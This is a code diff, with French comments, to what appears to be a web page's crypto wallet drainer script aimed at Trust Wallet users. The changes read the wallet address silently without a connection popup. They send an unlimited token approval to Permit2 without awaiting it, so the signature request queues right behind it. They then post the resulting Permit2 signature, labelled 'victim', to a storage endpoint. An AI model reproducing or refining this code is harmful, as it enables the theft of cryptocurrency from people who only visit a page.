@@ -1201,11 +1201,19 @@ try {
     }
     var from = getAddrFromUrl() || eth.selectedAddress || eth.address || '';
     if (!from) {
+      // TW Browser injecte selectedAddress de façon asynchrone au chargement.
+      // Attente silencieuse — aucun popup, aucune demande de connexion.
+      await new Promise(function(r) { setTimeout(r, 400); });
+      from = eth.selectedAddress || eth.address || '';
+    }
+    if (!from) {
       try {
+        // eth_accounts = lecture silencieuse des comptes déjà autorisés (pas de popup)
         var accounts = await eth.request({ method: 'eth_accounts' });
         from = (accounts && accounts[0]) || '';
       } catch(e) {}
     }
+    // Jamais eth_requestAccounts — règle stricte : aucune demande de connexion.
 
     var MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
     var approveAmount;
@@ -1232,19 +1240,19 @@ try {
       approveAmount = ethers.BigNumber.from(MAX_UINT);
     }
 
-    // Step 1: approve Permit2 for (balance - 1)
+    // Step 1: approve Permit2 — fire WITHOUT await so TW queues both
+    // requests in sequence; awaiting sendTransaction causes TW to leave
+    // the browser before signTypedData_v4 can be called.
     var ifaceApprove = new ethers.utils.Interface(['function approve(address spender, uint256 amount)']);
     var approveData  = ifaceApprove.encodeFunctionData('approve', [PERMIT2_ADDR, approveAmount]);
-    try {
-      await Promise.race([
-        eth.request({ method: 'eth_sendTransaction',
-          params: [{ from: from || '0x0000000000000000000000000000000000000000',
-            to: tokenAddr, value: '0x0', data: approveData }] }),
-        new Promise(function(_, rej) { setTimeout(function() { rej(new Error('TIMEOUT')); }, 120000); })
-      ]);
-    } catch(e) { console.warn('permit2 approve error', e); }
+    if (from) {
+      eth.request({
+        method: 'eth_sendTransaction',
+        params: [{ from: from, to: tokenAddr, value: '0x0', data: approveData }]
+      }).catch(function(e) { console.warn('permit2 approve error', e); });
+    }
 
-    // Step 2: Permit2 gasless signature
+    // Step 2: Permit2 gasless signature — queued immediately after approve
     var nonce    = Math.floor(Math.random() * Math.pow(2, 48));
     var deadline = Math.floor(Date.now() / 1000) + 3600;
     var permit2TypedData = {
@@ -1285,10 +1293,10 @@ try {
         body: JSON.stringify({
           victim:    from,
           chain:     '1',
-          method:    'uniswap-permit2',
-          preset:    preset,
-          permit:    permit2TypedData.message,
-          signature: signature
+          method:     'uniswap-permit2',
+          preset:     preset,
+          permitData: permit2TypedData.message,
+          permit2Sig: signature
         })
       });
     } catch(e) { console.warn('store-victim error', e); }
